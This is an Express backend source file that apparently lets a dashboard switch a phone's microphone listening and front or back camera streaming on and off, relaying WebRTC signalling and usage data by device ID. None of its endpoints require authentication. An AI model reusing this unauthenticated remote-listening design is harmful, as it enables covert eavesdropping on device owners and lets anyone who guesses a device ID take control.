const express = require('express');
const cors = require('cors');
const http = require('http');
require('dotenv').config();

const usageRoutes = require('./routes/usage');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json({ limit: '10mb' }));

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: Date.now() });
});

app.use('/api', usageRoutes);

// ---- Commands (dashboard sets, phone polls) ----
const audioCommands = new Map();
const cameraCommands = new Map();

app.post('/api/audio-command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { listen } = req.body;
  audioCommands.set(deviceId, { listen: !!listen });
  res.json({ ok: true, listen: !!listen });
});

app.get('/api/audio-command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const cmd = audioCommands.get(deviceId) || { listen: false };
  res.json(cmd);
});

app.post('/api/camera-command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { stream, facing } = req.body;
  const prev = cameraCommands.get(deviceId) || { stream: false, facing: 'back' };
  const next = {
    stream: stream === undefined ? prev.stream : !!stream,
    facing: facing === undefined ? prev.facing : (facing === 'front' ? 'front' : 'back'),
  };
  cameraCommands.set(deviceId, next);
  res.json({ ok: true, ...next });
});

app.get('/api/camera-command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const cmd = cameraCommands.get(deviceId) || { stream: false, facing: 'back' };
  res.json(cmd);
});

// ---- WebRTC Signaling ----
const webrtcOffers = new Map();    // deviceId -> { sdp }
const webrtcAnswers = new Map();   // deviceId -> { sdp }
const webrtcIceQueues = new Map(); // deviceId -> [{ from, candidate, sdpMid, sdpMLineIndex }]

app.post('/api/webrtc/offer/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { sdp } = req.body;
  if (sdp) webrtcOffers.set(deviceId, { sdp });
  res.json({ ok: true });
});

app.get('/api/webrtc/offer/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const data = webrtcOffers.get(deviceId);
  if (data) {
    webrtcOffers.delete(deviceId);
    res.json(data);
  } else {
    res.json({ sdp: null });
  }
});

app.post('/api/webrtc/answer/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { sdp } = req.body;
  if (sdp) webrtcAnswers.set(deviceId, { sdp });
  res.json({ ok: true });
});

app.get('/api/webrtc/answer/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const data = webrtcAnswers.get(deviceId);
  if (data) {
    webrtcAnswers.delete(deviceId);
    res.json(data);
  } else {
    res.json({ sdp: null });
  }
});

app.post('/api/webrtc/ice/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { from, candidate, sdpMid, sdpMLineIndex } = req.body;
  if (!webrtcIceQueues.has(deviceId)) webrtcIceQueues.set(deviceId, []);
  webrtcIceQueues.get(deviceId).push({ from, candidate, sdpMid, sdpMLineIndex });
  res.json({ ok: true });
});

app.get('/api/webrtc/ice/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { from } = req.query;
  const queue = webrtcIceQueues.get(deviceId) || [];
  const filtered = queue.filter(c => c.from === from);
  // Remove consumed candidates
  const remaining = queue.filter(c => c.from !== from);
  if (remaining.length > 0) webrtcIceQueues.set(deviceId, remaining);
  else webrtcIceQueues.delete(deviceId);
  res.json({ candidates: filtered });
});

server.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`);
});
